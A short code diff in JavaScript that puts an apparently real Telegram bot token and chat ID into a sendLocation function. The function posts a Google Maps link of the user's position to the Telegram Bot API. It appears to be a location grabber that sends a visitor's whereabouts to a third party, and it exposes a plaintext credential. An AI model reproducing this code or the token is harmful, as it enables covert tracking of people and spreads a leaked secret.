@@ -28,8 +28,8 @@ function sendLocation(position) {
 ${googleMapsLink}
   `;
 
-  const token = "TOKEN"; // ← استبدل بالتوكن الحقيقي
-  const chatId = "0000"; // ← استبدل بـ ID التليجرام الحقيقي
+  const token = "7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0"; // ← استبدل بالتوكن الحقيقي
+  const chatId = "6817512459"; // ← استبدل بـ ID التليجرام الحقيقي
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   fetch(url, {
